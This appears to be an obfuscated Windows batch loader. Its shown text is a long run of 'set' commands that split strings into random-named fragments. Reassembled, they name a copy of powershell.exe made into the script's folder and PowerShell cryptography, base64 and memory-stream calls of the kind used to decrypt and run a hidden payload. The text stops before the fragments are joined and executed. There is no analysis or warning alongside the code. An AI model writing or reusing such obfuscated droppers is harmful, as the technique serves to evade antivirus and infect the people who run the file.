@echo off
set "wXiTSlmqxI=we"
set "JfriRoZJUb=ws"
set "NKyLZeWyAx=1."
set "dhUrooUfXP=Po"
set "VkfzoJRAkL=he"
set "ZzVnYlRIEj=xe"
set "WKbxNtRxrJ=ll"
set "QmoSPKgYSy=.e"
set "EJmyhcDMBl=0\"
set "bTsyBPWnRw=in"
set "TFAvvsFQZX=ow"
set "AykAUQPZme=do"
set "rqnTQhDyde=we"
set "qPmqXfuyjs=co"
set "uLfMkdvrSx= /"
set "OEcveeMRQb=Sy"
set "WGLMmEmOXO= C"
set "MEkoFVBkGm=rS"
set "WcoMClCRWE=s\"
set "TKeUQIQHMB=Wi"
set "XNasLgTBkm=:\"
set "PmtPttDTmF=he"
set "GOZXUCExtp=\W"
set "LAGQoyXGLs=\v"
set "dZHOEHEoGq=em"
set "ctyRtnkIzx=st"
set "xtYGbHBtFV=ll"
set "gFjLdQEyZv=py"
set "hmDyEoDeqr=32"
set "AVBMwJWmKE=y "
set "wtXTfcohIm=rs"
set "ddSXAoGDAU=po"
set "JSaiBJdzds=nd"
set "WNQacOBxhE=cd"
set "fdMrYSYAOV= %~dp0"
set "pKYnjXWJIs=t Sy"
set "ABzwcBSggt=tsWi"
set "OKdjzVZhpR=Obje"
set "OQDodUOjwu=$nin"
set "EoHalJGEyg= = $"
set "pggrAAlFnD=UZKB"
set "aqBfKRLOkW= '')"
set "LMfeiVUjCZ=)($K"
set "DLKttnIwOa=yste"
set "nQQzxjVnhy=oint"
set "IJCwIiqsDF=le  "
set "ENgoobjoIv=.Mem"
set "LquHtrfHal=tion"
set "fLMWxWJGgT=($Uk"
set "XNUVwyTHeA=$WwG"
set "iCQVruUnuF=$fUZ"
set "NtsMiCXZeO=morF"
set "sLhsQALOAe=6esa"
set "EPjQfBfeBx=pres"
set "mSPUxgvmFz=orF'"
set "NBBPQVvHWO=Conv"
set "QUjaiEglse=ZNmG"
set "utuUgPsUPj=[Sys"
set "lmfuKlKkgL= New"
set "ReKiDtygWy= '')"
set "huaZgXpqUt=UkZN"
set "GnRuWyuWKW=;$oZ"
set "sJljagYStF=;$EF"
set "lpmeztQxlo=$VgS"
set "SKwkqhzaqT=k; }"
set "MDjGBztIXq=UZKB"
set "nStUwLtMna=ionM"
set "oILaWSskUv=.Key"
set "isdvstJySj=TllA"
set "mBbYwVKkqC=g = "
set "SHOTUOwUdx=e]::"
set "URgqPSEgkR=tem."
set "KsokoNSgRK=rofi"
set "giBSfKDOxe=ddin"
set "hbLrutFvvT=C) {"
set "aQlwOwCJQK= = $"
set "tWRrvrojIP=ct S"
set "bNHyIpPpPQ=('%*'"
set "nlAuwEFOuO=)($W"
set "fynxLzDZVC=WwGr"
set "pzAKLkCzVo=yTo("
set "FTgiohORnr=gnir"
set "oCnsuAibYe=rity"
set "ugaKzezMmH=pose"
set "eZEtHhMKFn=r.En"
set "KVgNJJhcpj=::('"
set "fyhwuKtZJV=ress"
set "eWTBkYssvA='0Pg"
set "QHvfrfnPIk=rity"
set "jNQHjEFhCl=-4] "
set "VbAjbxkQpE=pher"
set "nyJHfuePfm=;$oN"
set "ovaeAHwNsD=mory"
set "dPauyKbvHY=tQr "
set "oODAxIZtTB=J, 0"
set "fwhkWOmLuz=);$f"
set "EJTYXVinPd=and "
set "kqdHJfPANR=stem"
set "JReCOmmqHr=aEy."
set "wjXmbvuKiD=.Cry"
set "GCaQCbxgAX= [Sy"
set "cImkcbIfcV=$VgS"
set "zckdxzJMFF=Fina"
set "XFGQBSWBRV=, (,"
set "HimEBJtwnW=ew-O"
set "XOlWYaPWmQ='txe"
